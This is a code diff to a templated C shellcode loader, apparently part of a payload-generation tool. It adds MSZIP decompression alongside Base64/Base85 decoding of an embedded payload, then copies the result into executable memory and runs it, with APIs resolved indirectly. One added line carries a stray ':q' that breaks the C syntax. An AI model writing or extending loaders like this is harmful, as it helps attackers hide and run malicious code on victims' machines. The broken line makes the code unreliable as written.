@@ -3,9 +3,11 @@
 #include <stdio.h>
 #include <debugapi.h>
 {% endif %}
-{% if bytecode_transformation == 'base85_encoder' %}
+{% if bytecode_transformation or bytecode_compression %}
 #include <stdint.h>
 #include <stdbool.h>
+#include <compressapi.h>
+#include <ntstatus.h>
 {% endif %}
 
 // We're using DEBUG_PRINT macro if debug mode is selected
@@ -33,6 +35,9 @@ unsigned int transformed_bytecode_len = sizeof(transformed_bytecode);
 {% elif bytecode_transformation == 'base85_encoder' %}
     {% include 'partials/decode_base85.c.j2' %}
 {% endif %}
+{% if bytecode_compression == 'mszip_compressor' %}
+    {% include 'partials/decompress_mszip.c.j2' %}
+{% endif %}
 
 
 // --- Function Forward Declarations ---
@@ -42,35 +47,59 @@ void ResolveAPIs();
 
 // --- Main Logic ---
 void Run() {
-    unsigned char* decoded_bytecode = NULL;
-    size_t decoded_bytecode_len = 0;
-    void* exec_memory_block = NULL; 
+    unsigned char* current_data = transformed_bytecode;
+    size_t current_len = transformed_bytecode_len;
+    unsigned char* decoded_data = NULL;
+    size_t decoded_len = 0;
+    unsigned char* decompressed_data = NULL;
+    size_t decompressed_len = 0;
+    void* exec_memory_block = NULL;
+    
     ResolveAPIs();
 
+    
     {% if bytecode_transformation == 'base64_encoder' %}
-        decoded_bytecode_len = (transformed_bytecode_len / 4) * 3 + 4;
-        decoded_bytecode = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_bytecode_len);
-        Base64Decode(transformed_bytecode, transformed_bytecode_len, decoded_bytecode, &decoded_bytecode_len);
-        DEBUG_PRINT("Run: Payload base64 decoded!");
+        decoded_len = (current_len / 4) * 3 + 4;
+        decoded_data = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_len);
+        Base64Decode(current_data, current_len, decoded_data, &decoded_len);
+        DEBUG_PRINT("Run: Base64 decoded payload");
+        current_data = decoded_data;
+        current_len = decoded_len;
+
     {% elif bytecode_transformation == 'base85_encoder' %}
-        decoded_bytecode_len = (transformed_bytecode_len / 5) * 4 + 4;
-        decoded_bytecode = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_bytecode_len);
-        Base85Decode(transformed_bytecode, transformed_bytecode_len, decoded_bytecode, &decoded_bytecode_len);
-        DEBUG_PRINT("Run: Payload base85 decoded");
-    {% else %}
-        decoded_bytecode = transformed_bytecode;
-        decoded_bytecode_len = transformed_bytecode_len;
+        decoded_len:q = (current_len / 5) * 4 + 4;
+        decoded_data = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_len);
+        Base85Decode(current_data, current_len, decoded_data, &decoded_len);
+        DEBUG_PRINT("Run: Base85 decoded payload");
+        current_data = decoded_data;
+        current_len = decoded_len;
     {% endif %}
 
-    exec_memory_block = AllocateExecutableMemory(decoded_bytecode_len);
-    ExecutePayload(exec_memory_block, decoded_bytecode, decoded_bytecode_len);
-
-    {% if bytecode_transformation in ['base64_encoder', 'base85_encoder'] %}
-        if (decoded_bytecode != NULL) {
-            pfnHeapFree(pfnGetProcessHeap(), 0, decoded_bytecode);
-            DEBUG_PRINT("Run: Freed memory from decoding buffer.");
+    {% if bytecode_compression == 'mszip_compressor' %}
+        decompressed_data = MszipDecompress(current_data, current_len, &decompressed_len);
+        if (decompressed_data == NULL) {
+            DEBUG_PRINT("Run: MSZIP decompression failed!");
+            if (decoded_data != NULL) pfnHeapFree(pfnGetProcessHeap(), 0, decoded_data);
+            return;
         }
+        DEBUG_PRINT("Run: MSZIP decompressed payload");
+        current_data = decompressed_data;
+        current_len = decompressed_len;
     {% endif %}
+
+    // Execution
+    exec_memory_block = AllocateExecutableMemory(current_len);
+    ExecutePayload(exec_memory_block, current_data, current_len);
+
+    // Cleanup goes here
+    if (decoded_data != NULL) {
+        pfnHeapFree(pfnGetProcessHeap(), 0, decoded_data);
+        DEBUG_PRINT("Run: Freed memory from decoding buffer.");
+    }
+    if (decompressed_data != NULL) {
+        pfnHeapFree(pfnGetProcessHeap(), 0, decompressed_data);
+        DEBUG_PRINT("Run: Freed memory from decompression buffer.");
+    }
 
 }
 
